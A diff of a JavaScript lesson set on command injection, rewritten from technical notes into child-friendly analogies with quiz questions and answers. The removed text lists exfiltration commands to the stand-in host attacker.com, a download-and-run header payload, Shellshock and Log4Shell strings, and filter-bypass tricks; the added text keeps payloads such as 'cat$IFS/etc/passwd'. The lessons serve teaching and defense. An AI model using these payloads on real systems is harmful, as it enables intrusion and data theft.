@@ -1,325 +1,97 @@
 const LESSONS = [
   {
-    title: "What is Command Injection?",
+    title: "1. The Boss Computer (Command Injection)",
     points: 10,
-    content: `Command Injection (OS Command Injection) lets an attacker execute arbitrary system commands on the server — often leading to full server compromise.
+    content: `WHAT IS COMMAND INJECTION?
+Imagine your computer is a giant spaceship, and deep inside the control room is the captain's chair. Whoever sits in that chair can give orders to the entire ship. They can say "turn off the lights," "delete all the files," or "give me all the passwords." This control room is called the "Operating System Shell." Normally, only the owner of the computer is allowed to sit in that chair. But sometimes, a website asks you a simple question, like "What is your IP address so I can ping it?" The website takes your answer, runs all the way down to the control room, and hands your answer to the captain to execute. "Command Injection" is a terrifying attack where a hacker writes a sneaky, secret order right next to their IP address. When the website hands the note to the captain, the captain accidentally executes the hacker's secret order too!
 
-HOW IT HAPPENS:
-Applications pass user input to the OS shell without sanitization:
-  Python:  os.system("ping " + user_input)
-           subprocess.run("nmap " + user_input, shell=True)
-  PHP:     system("whois " + $_GET['domain'])
-           exec("ping " + $_POST['ip'])
-  Node.js: exec("nslookup " + hostname, callback)
+HOW THE SNEAKY ORDER WORKS
+If a website asks for an IP address to ping, a normal user types "8.8.8.8". The captain in the control room says, "Okay, I will ping 8.8.8.8." But a hacker types "8.8.8.8; whoami". They added a sneaky semicolon (;). In computer language, a semicolon means "Stop what you are doing, take a breath, and instantly do this next thing!" The website grabs the hacker's answer, runs to the captain, and says, "Please run: ping 8.8.8.8; whoami." The captain pings the address, takes a breath, and then runs the "whoami" command, which prints out the name of the secret user running the spaceship! The hacker just tricked the captain into obeying their commands from thousands of miles away.
 
-EXAMPLE — A PING UTILITY:
-  URL: http://site.com/ping?ip=8.8.8.8
-  Server runs: ping -c 4 8.8.8.8
-
-  Attacker injects:
-  http://site.com/ping?ip=8.8.8.8; whoami
-  Server now runs: ping -c 4 8.8.8.8; whoami
-  Output includes result of whoami (e.g., "www-data")
-
-SHELL OPERATORS FOR COMMAND CHAINING:
-  ;           Semicolon — always runs next command
-  &&          AND — runs next command only if first succeeds
-  ||          OR  — runs next command only if first fails
-  |           Pipe — sends output of first to second
-  $()         Command substitution (runs inline)
-  \`cmd\`       Backtick substitution (old-style)
-  \n or %0a   Newline — starts a new command in many contexts
-
-QUICK DETECTION PAYLOADS:
-  ; sleep 5       (5 second delay = vulnerable)
-  && sleep 5
-  | sleep 5
-  \`sleep 5\`
-  $(sleep 5)
-
-If the response takes 5 seconds longer than normal, command injection is confirmed.`,
+THE HACKER'S PUNCTUATION MARKS
+Hackers use a bunch of special punctuation marks to glue their secret orders onto normal answers. The semicolon (;) is the most famous, because it always runs the next command no matter what. But hackers also use two "AND" symbols (&&), which means "Only run my secret order if the first order works perfectly." If they use two "PIPE" symbols (||), it means "Only run my secret order if the first order totally fails!" Sometimes, hackers use a single straight line (|) called a Pipe. This tells the captain, "Take the answer from the first order, and shove it straight into the mouth of my second order!" By using these tiny symbols, hackers can chain together massive, complicated attacks just by typing in a simple search box.`,
     questions: [
-      { q: "What shell operator chains commands and runs the next command regardless of success?", a: ";" },
-      { q: "What shell operator runs the next command ONLY if the first command succeeds?", a: "&&" },
-      { q: "In Python, what function with shell=True is commonly vulnerable to command injection?", a: "subprocess.run()" },
-      { q: "What command substitution syntax embeds a command's output into another command?", a: "$()" },
-      { q: "What simple time-delay injection is used to confirm command injection vulnerability?", a: "; sleep 5 (or && sleep 5, | sleep 5)" }
+      { q: "What is the attack called where hackers sneak secret orders to the computer's captain?", a: "Command Injection" },
+      { q: "What is the name of the 'control room' where the captain sits?", a: "Operating System Shell" },
+      { q: "What tiny punctuation mark (;) means 'Stop what you are doing, take a breath, and do this next thing'?", a: ";" },
+      { q: "What symbols (&&) mean 'Only run my secret order if the first one works'?", a: "&&" },
+      { q: "What command did the hacker use to ask the captain for the name of the secret user?", a: "whoami" }
     ]
   },
   {
-    title: "Blind Command Injection",
+    title: "2. Hacking in the Dark (Blind Injection)",
     points: 10,
-    content: `Blind Command Injection — the command runs on the server but you cannot see the output directly in the HTTP response.
+    content: `WHAT IS BLIND COMMAND INJECTION?
+Imagine you slide a secret note under the door to the captain's control room, ordering them to read the ship's secret diary. The captain reads the diary, but there is no window in the door, and the captain doesn't slide the paper back out to you. You know the captain obeyed your order, but you can't see the answer! This is called "Blind Command Injection." A lot of modern websites are very careful. Even if you trick the captain into running a secret command, the website refuses to print the answer on your screen. You are completely in the dark. But just like with blind database tricks, hackers have invented incredibly clever ways to steal the answers without ever seeing them.
 
-BLIND INJECTION DETECTION:
+THE STOPWATCH TRICK
+If a hacker is blind, they use a stopwatch. They slide a note under the door that says: "Captain, if you are reading this, go to sleep for exactly 5 seconds!" In computer language, they type "; sleep 5". The hacker clicks the button and starts their stopwatch. If the website spins and loads for exactly 5 extra seconds, the hacker shouts, "Aha! The captain obeyed my order!" This is called Time-Based Detection. It proves that the control room door is unlocked, even if the hacker can't see inside. Once the hacker knows the door is unlocked, they can start using even sneakier tricks to extract the treasure.
 
-1. TIME-BASED DETECTION (Most reliable):
-   Linux:   ; sleep 5
-   Windows: & ping -n 5 127.0.0.1
-            | timeout 5
-   If response takes 5 extra seconds, injection is confirmed.
-
-2. OUT-OF-BAND (OOB) EXFILTRATION:
-   HTTP exfiltration (using curl):
-     ; curl "http://attacker.com/$(whoami)"
-     ; wget "http://attacker.com/?data=$(id)"
-
-   DNS exfiltration (using nslookup):
-     ; nslookup $(whoami).attacker.com
-     ; nslookup \`cat /etc/hostname\`.attacker.com
-   On your server: check access logs or DNS records.
-
-3. FILE WRITE EXFILTRATION:
-   Write output to a web-accessible file, then visit it:
-     ; whoami > /var/www/html/output.txt
-     ; cat /etc/passwd > /var/www/html/dump.txt
-   Then: http://site.com/output.txt
-
-4. PAYLOAD ENCODING (bypass filters):
-   If ; is blocked:   %3b (URL-encoded ;)
-   If & is blocked:   %26 (URL-encoded &)
-   If | is blocked:   %7c (URL-encoded |)
-   Space bypass:      $IFS (Internal Field Separator in bash)
-   Brace expansion:   {cat,/etc/passwd} (no spaces needed)
-
-PREVENTION:
-  - Never pass user input to shell commands — use APIs/libraries instead
-  - If unavoidable: strictly validate input with a whitelist
-  - Use parameterized process calls: subprocess.run(['ping', ip]) NOT shell=True
-  - Apply principle of least privilege to the web server process`,
+MAILING THE TREASURE HOME
+If the hacker can't see the treasure through the door, they just tell the captain to mail the treasure to the hacker's house! This is called "Out-of-Band Exfiltration." The hacker slides a note that says: "Captain, read the secret diary, put it inside a digital envelope, and mail it to attacker.com." The captain obeys! The captain uses a tool like 'curl' or 'nslookup' to package up the secret files and send them flying across the internet straight to the hacker's secret server. The website screen might just say "Thank you for your input," but behind the scenes, the captain just mailed the keys to the castle directly to the bad guy.`,
     questions: [
-      { q: "What technique uses a sleep command to confirm blind command injection?", a: "Time-based detection" },
-      { q: "What DNS-based technique sends command output to an attacker's server as a subdomain?", a: "DNS exfiltration" },
-      { q: "What command on Linux shows your current username?", a: "whoami" },
-      { q: "What prevention technique passes arguments as a list instead of a shell string (Python)?", a: "subprocess.run(['cmd', 'arg']) — avoiding shell=True" },
-      { q: "What special bash variable can replace spaces in payloads to bypass space filters?", a: "$IFS" }
+      { q: "What is the attack called when the captain obeys your order, but you cannot see the answer on your screen?", a: "Blind Command Injection" },
+      { q: "What word does a hacker type to make the Linux captain go to sleep for 5 seconds?", a: "sleep 5" },
+      { q: "If the website takes 5 extra seconds to load, what does it prove to the hacker?", a: "That the captain obeyed the order (the door is unlocked)" },
+      { q: "What is the trick called where the captain mails the treasure directly to the hacker's server?", a: "Out-of-Band Exfiltration" },
+      { q: "What tool might the captain use to mail the digital envelope across the internet?", a: "curl (or nslookup)" }
     ]
   },
   {
-    title: "Command Injection Tools & Defense",
+    title: "3. Disguises and Sneaky Tricks",
     points: 10,
-    content: `Professional penetration testers use specific tools to find and exploit command injection, and defenders need layered controls to prevent them.
+    content: `THE SECURITY GUARDS
+Because Command Injection is so dangerous, programmers hire digital security guards to check every single note before it goes to the captain. If the guard sees a semicolon (;), a pipe (|), or an AND symbol (&), they rip the note up and throw it away! But hackers are masters of disguise. If the guard blocks the semicolon, the hacker might use a secret URL code, typing "%3b" instead. The guard looks at "%3b", gets confused, and lets it pass. When the note reaches the control room, the captain instantly recognizes "%3b" as a semicolon and executes the secret order! 
 
-TESTING TOOLS:
+THE INVISIBLE SPACE BAR
+Sometimes the guards are so strict that they ban the space bar! If the hacker can't type a space, they can't type "cat /etc/passwd" (the command to read the password file). The note is stuck together as "cat/etc/passwd", which makes no sense to the captain. To get around this, hackers use a magical variable called $IFS. In the bash language, $IFS stands for Internal Field Separator, which is just a super fancy computer word for "an invisible space." The hacker types "cat$IFS/etc/passwd". The guard sees no spaces and lets it through. The captain sees the magical $IFS, instantly turns it into a space, and reads the secret password file! 
 
-Commix (Automated Command Injection):
-  The most popular dedicated command injection tool.
-  Automatically detects and exploits all types.
-  Example: commix --url="http://site.com/ping?ip=INJECT_HERE"
-  Supports: GET, POST, cookie-based, header-based injection.
-
-Burp Suite:
-  - Repeater: manually test payloads
-  - Intruder: automate with a command injection wordlist
-  - Scanner: detect some command injection flaws
-
-COMMAND INJECTION CONTEXT MATTERS:
-  UNIX shell:     ; cat /etc/passwd
-  Windows CMD:    & type C:\\Windows\\win.ini
-  PowerShell:     ; Get-Content C:\\flag.txt
-
-POST-EXPLOITATION COMMANDS (after RCE is confirmed):
-  whoami           → Current user
-  id               → User and group IDs
-  uname -a         → OS version and kernel (Linux)
-  ifconfig/ip addr → Network interfaces
-  ls -la /         → Root directory listing
-  cat /etc/passwd  → User accounts
-  env              → Environment variables (secrets!)
-  ps aux           → Running processes
-
-DEFENSE IN DEPTH:
-
-1. Avoid shell calls — use library functions:
-   Instead of: exec("nslookup " + domain)
-   Use:        dns.resolve(domain)  ← no shell involved
-
-2. Input Whitelist:
-   Only allow: ^[a-zA-Z0-9.\\-]+$
-   Reject any input with ; & | \` $ ( ) < > \\ characters
-
-3. Escape input (last resort):
-   Python: shlex.quote(user_input)
-   PHP:    escapeshellarg($input)
-
-4. Drop privileges:
-   Run the web server as a dedicated low-privilege user (not root!)
-   Use chroot jails or containers to isolate the process`,
+THE WILDCARD TRICK
+What if the guard bans the word "passwd" so the hacker can't ask for the password file? The hacker uses a "Wildcard." A wildcard is like a blank tile in Scrabble; it can be any letter you want! The most famous wildcard is the question mark (?). The hacker types "/etc/p?sswd". The guard looks at it and says, "Well, it doesn't say passwd, so it must be safe." They let it through. When the captain reads it, the captain says, "Hmm, I need to find a file that starts with P, has any letter in the middle, and ends in SSWD. Oh! You mean the passwd file!" The captain grabs the file and hands it over. The hacker got the passwords without ever typing the word!`,
     questions: [
-      { q: "What dedicated automated tool detects and exploits all types of command injection?", a: "Commix" },
-      { q: "What Python function safely escapes a string for use in a shell command?", a: "shlex.quote()" },
-      { q: "What PHP function escapes a string for use as a single shell argument?", a: "escapeshellarg()" },
-      { q: "What is the most effective way to prevent command injection — avoiding shell calls entirely?", a: "Use library/API functions instead of shell commands (e.g., dns.resolve() instead of nslookup)" },
-      { q: "What post-exploitation command reveals environment variables that may contain secrets?", a: "env" }
+      { q: "What secret URL code do hackers type to disguise a semicolon from the guards?", a: "%3b" },
+      { q: "What magical bash variable acts like an invisible space bar to bypass space filters?", a: "$IFS" },
+      { q: "What is the 'blank Scrabble tile' trick called where a symbol replaces a letter?", a: "a Wildcard" },
+      { q: "What punctuation mark is used as a wildcard to represent any single letter?", a: "?" },
+      { q: "If the hacker types '/etc/p?sswd', what file does the captain actually open?", a: "passwd (or /etc/passwd)" }
     ]
   },
   {
-    title: "Advanced Payloads & WAF Bypass",
+    title: "4. Taking Over the Spaceship",
     points: 10,
-    content: `When basic payloads are blocked by filters or WAFs, attackers use encoding tricks and alternative syntax to bypass them.
+    content: `EXPLORING THE SHIP
+Once a hacker successfully tricks the captain and gets an open line of communication into the control room, they start looking around. The very first thing they ask is, "Who am I?" (whoami). They want to know if they are a low-level crew member or the supreme commander (root). If they are a low-level member, they type "ls -la /", which tells the captain to print a map of every single folder and file on the entire spaceship. The hacker is looking for secret keys, hidden passwords left by lazy programmers, or misconfigured doors. They type "env" to look at the environment variables, which are like sticky notes the captain leaves on the wall; sometimes these sticky notes have the master passwords for the databases written right on them!
 
-SPACE BYPASS TECHNIQUES:
-  Standard:   ; cat /etc/passwd
-  $IFS:       ;cat${IFS}/etc/passwd
-  Brace:      {cat,/etc/passwd}
-  Tab (%09):  ;cat%09/etc/passwd
-  Redirect:   ;cat</etc/passwd
+THE AUTOMATIC HACKING ROBOT
+Finding all these secrets by hand takes a long time. So, professional hackers use an amazing automatic robot tool called "Commix." Commix was built specifically to find and exploit Command Injection. You just point Commix at a website, and the robot automatically tries thousands of different semicolons, pipes, invisible spaces, and sleep spells. If it finds a tiny crack in the armor, Commix rips the door open and gives the hacker a beautiful, black terminal screen. It looks exactly like the hacker is sitting in the captain's chair, even though they are thousands of miles away. 
 
-SPECIAL CHARACTER BYPASS:
-  Variable tricks (bash):
-    $() or backticks can hide commands in parameters:
-      ip=8.8.8.8;$(id)
-    Concatenation bypass:
-      c$()at /etc/passwd   ($ expands to empty, making "cat")
-      c""at /etc/passwd    (empty string in quotes)
-
-  Wildcards:
-    /etc/p?sswd     (? matches any single char)
-    /etc/pas*d      (* matches any sequence)
-    /???/????d      (purely wildcard-based path)
-
-ENCODING BYPASS:
-  Base64 encoding (bash):
-    ; echo "d2hvYW1p" | base64 -d | bash
-    (d2hvYW1p = "whoami" in base64)
-  Hex encoding:
-    ; printf "\x77\x68\x6f\x61\x6d\x69" | bash
-    (hex for "whoami")
-
-COMMAND INJECTION IN DIFFERENT INJECTION POINTS:
-  HTTP Headers (often logged, sometimes executed):
-    User-Agent: ;wget http://attacker.com/shell.sh;bash shell.sh
-    X-Forwarded-For: 127.0.0.1; id
-  Cookie Values:
-    Cookie: user=admin; id #
-  JSON body:
-    {"ip": "8.8.8.8; id"}
-  XML body:
-    <ip>8.8.8.8; id</ip>
-
-WINDOWS-SPECIFIC PAYLOADS:
-  & whoami
-  | whoami
-  ; whoami (PowerShell only)
-  %COMSPEC% /c whoami
-  cmd.exe /c whoami
-  powershell -c whoami`,
+THE WORST BUGS IN HISTORY
+Command Injection has caused some of the most terrifying cyber-disasters in history. In 2014, a bug called "Shellshock" let hackers send secret orders to millions of internet servers just by changing their "User-Agent" (a note that tells the server what browser you are using). The servers were completely taken over. In 2021, an even worse bug called "Log4Shell" was discovered. Hackers could type a tiny line of code into a Minecraft chat box, and the Minecraft server would accidentally fetch a virus and run it in the control room! These bugs prove that if you let anyone talk to the captain, disaster is guaranteed.`,
     questions: [
-      { q: "What bash variable replaces a space character in command injection payloads to bypass space filters?", a: "$IFS" },
-      { q: "How can you use base64 encoding to hide a command injection payload in bash?", a: "echo 'base64string' | base64 -d | bash" },
-      { q: "What wildcard character matches exactly one character in a file path?", a: "? (question mark)" },
-      { q: "What Windows command interpreter variable can be used to launch cmd.exe in a command injection payload?", a: "%COMSPEC%" },
-      { q: "What bash trick uses an empty variable inside a command name to bypass keyword filters?", a: "c$()at (dollar sign with empty subshell makes the word 'cat')" }
+      { q: "What command prints a map of every single folder and file on the spaceship?", a: "ls -la /" },
+      { q: "What command reads the 'sticky notes' on the wall that might contain master passwords?", a: "env" },
+      { q: "What is the name of the automatic robot tool built specifically to exploit Command Injection?", a: "Commix" },
+      { q: "What terrifying 2014 bug let hackers take over servers just by changing their 'User-Agent' note?", a: "Shellshock" },
+      { q: "What 2021 bug let hackers take over servers just by typing a code into a Minecraft chat box?", a: "Log4Shell" }
     ]
   },
   {
-    title: "Real-World Command Injection Cases",
+    title: "5. Putting the Captain in a Bubble (Defense)",
     points: 10,
-    content: `Real-world command injection vulnerabilities have led to some of the most severe breaches in cybersecurity history.
+    content: `THE GOLDEN RULE OF DEFENSE
+If Command Injection is so terrifying, how do we stop it? The absolute best defense in the entire world is very simple: Never, ever let strangers talk to the captain! Programmers should never take a user's input and pass it directly to the Operating System Shell. If a website needs to ping an IP address, it shouldn't ask the captain to open a command line and type "ping." Instead, it should use a safe, built-in library function. A library function is like a tiny, specialized robot that only knows how to do one exact thing. If you hand the tiny robot an IP address, it pings it. If a hacker hands the tiny robot a tricky semicolon (; whoami), the tiny robot just stares at it blankly because it doesn't understand semicolons. The tiny robot cannot be tricked!
 
-NOTABLE CVEs & INCIDENTS:
+THE SAFE LIST (WHITELISTING)
+Sometimes, programmers absolutely have to talk to the captain. If they must do it, they have to use a "Whitelist." A whitelist is an incredibly strict bouncer. If the website asks for an IP address, the bouncer only allows numbers and periods to pass through the door. If the bouncer sees a letter, a semicolon, a space, or a wildcard, they instantly throw the note in the trash. Blacklists (trying to guess all the bad words) never work because hackers will always find a new disguise or a new alien code. Whitelists only allow the exact things you expect, which shuts down the hackers completely.
 
-1. SHELLSHOCK (CVE-2014-6271) — Bash:
-   A flaw in how Bash processes environment variables.
-   Sending a crafted HTTP request could execute commands via CGI scripts:
-     curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://victim.com/cgi-bin/test.cgi
-   Impact: Millions of servers vulnerable. CVSS Score: 10.0 (Critical).
-   Affected: Apache CGI, DHCP clients, OpenSSH ForceCommand.
-
-2. LOG4SHELL (CVE-2021-44228) — Java Log4j:
-   Not traditional OS command injection, but injection via JNDI lookup:
-     \${jndi:ldap://attacker.com/exploit}
-   When logged by Log4j, it fetches and executes a remote Java class.
-   Impact: Affected virtually every enterprise Java application.
-   CVSS Score: 10.0. One of the worst vulnerabilities ever discovered.
-
-3. STRUTS2 (CVE-2017-5638) — Apache Struts:
-   OGNL injection in the Content-Type header led to RCE.
-   Used in the Equifax breach (143 million records stolen, 2017).
-
-4. GITBLEED / GITPASTE-12 (2020):
-   A worm exploiting command injection vulnerabilities in misconfigured
-   Git repositories and Docker APIs exposed to the internet.
-
-5. IOT COMMAND INJECTION (ongoing):
-   Routers and IoT devices frequently have command injection in:
-   - Ping utilities
-   - DNS configuration forms
-   - Network diagnostic pages
-   These power large botnets (e.g., Mirai variants).
-
-POST-EXPLOITATION PILLARS:
-  1. Persistence: add cron jobs, SSH keys, backdoor users
-  2. Lateral movement: pivot to internal network via the server
-  3. Data exfiltration: steal databases, config files, secrets
-  4. Privilege escalation: exploit SUID binaries, kernel exploits`,
+ESCAPING THE TRAPS
+If the programmer is stuck using old code, they have one last line of defense called "Escaping." This means taking the hacker's tricky note and wrapping it in layers of thick, protective digital bubble wrap before handing it to the captain. In Python, programmers use a tool called "shlex.quote()", and in PHP they use "escapeshellarg()". When the captain receives the bubble-wrapped note, the captain sees the semicolon, but the bubble wrap physically prevents the captain from executing it. The captain just reads the semicolon out loud instead of obeying it. It is always better to not talk to the captain at all, but if you must, make sure every word is safely wrapped in plastic!`,
     questions: [
-      { q: "What CVE number identified the critical Bash vulnerability known as 'Shellshock'?", a: "CVE-2014-6271" },
-      { q: "What Java logging library had CVE-2021-44228 (Log4Shell), a critical injection vulnerability?", a: "Log4j" },
-      { q: "What major 2017 data breach exploited a command injection flaw in Apache Struts?", a: "Equifax breach" },
-      { q: "What JNDI-based payload was used in the Log4Shell vulnerability?", a: "${jndi:ldap://attacker.com/exploit}" },
-      { q: "What type of devices commonly run command injection vulnerabilities in their network diagnostic pages?", a: "Routers and IoT devices" }
-    ]
-  },
-  {
-    title: "Secure Implementation & Code Review",
-    points: 10,
-    content: `The ultimate defense against command injection is to never call the OS shell with user input. Here is how to achieve this in every major language.
-
-PYTHON — NEVER USE shell=True WITH USER INPUT:
-  # VULNERABLE:
-  os.system("ping " + user_ip)
-  subprocess.run("nmap " + target, shell=True)
-
-  # SAFE — use list of arguments (no shell spawned):
-  import subprocess, shlex
-  result = subprocess.run(["ping", "-c", "4", user_ip], capture_output=True, text=True, timeout=10)
-
-  # SAFE — use dedicated library:
-  import socket
-  ip = socket.gethostbyname(domain)  # DNS lookup without shell
-
-PHP — AVOID exec/system WITH USER INPUT:
-  # VULNERABLE:
-  $output = shell_exec("whois " . $_GET['domain']);
-
-  # SAFE — use escapeshellarg (last resort for legacy code):
-  $safe = escapeshellarg($_GET['domain']);
-  $output = shell_exec("whois " . $safe);
-
-  # BETTER — use PHP library:
-  // Use PHP's native network functions instead of calling CLI tools
-
-NODE.JS:
-  # VULNERABLE:
-  exec("ls " + req.query.path, callback);
-
-  # SAFE — use list form:
-  const { execFile } = require("child_process");
-  execFile("ls", [req.query.path], callback);  // No shell spawned
-
-  # EVEN BETTER:
-  const fs = require("fs");
-  fs.readdir(safePath, callback);  // No OS command at all
-
-CODE REVIEW CHECKLIST:
-  ✔ Search for: exec, system, popen, spawn, shell=True, backticks
-  ✔ Trace every variable reaching those calls back to user input
-  ✔ Verify all user input is validated with a strict whitelist
-  ✔ Confirm input is never concatenated into OS command strings
-  ✔ Check all HTTP headers, cookies, and body params — not just URL
-  ✔ Review CI/CD pipelines for injected build commands
-
-STATIC ANALYSIS TOOLS:
-  Bandit (Python):  bandit -r . -t B602,B603,B605
-  Semgrep:          semgrep --config=p/command-injection
-  SonarQube:        built-in command injection detection rules`,
-    questions: [
-      { q: "In Python, what safe alternative to shell=True passes arguments as a list to subprocess.run()?", a: "subprocess.run(['cmd', 'arg1', 'arg2'], ...) — a list, not a string" },
-      { q: "In Node.js, what function runs a process without spawning a shell, making command injection impossible?", a: "execFile()" },
-      { q: "What Python static analysis tool detects dangerous calls like subprocess with shell=True?", a: "Bandit" },
-      { q: "What Semgrep config pack scans code specifically for command injection patterns?", a: "p/command-injection" },
-      { q: "What PHP function should be used as a last resort to safely escape user input for shell arguments?", a: "escapeshellarg()" }
+      { q: "What is the absolute best way to prevent Command Injection?", a: "Never let user input talk to the Operating System Shell (use library functions instead)" },
+      { q: "What is the name of the incredibly strict bouncer that only allows safe characters (like numbers) through?", a: "a Whitelist" },
+      { q: "Do Blacklists (trying to block all bad words) work against hackers? (yes/no)", a: "no" },
+      { q: "What is the last-resort defense where you wrap the user's input in protective digital bubble wrap?", a: "Escaping" },
+      { q: "What PHP tool is used to bubble-wrap the hacker's note before handing it to the captain?", a: "escapeshellarg()" }
     ]
   }
 ];
